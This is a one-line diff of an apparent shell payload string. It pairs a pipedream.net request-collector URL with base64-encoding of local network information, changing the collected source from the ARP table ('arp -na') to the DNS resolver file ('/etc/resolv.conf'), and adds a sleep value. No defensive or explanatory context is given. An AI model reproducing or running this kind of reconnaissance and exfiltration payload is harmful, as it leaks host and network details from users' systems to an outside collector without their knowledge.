@@ -1,1 +1,1 @@
-domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; arp -na | base64; sleep=230
+domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; cat /etc/resolv.conf | base64; sleep=230
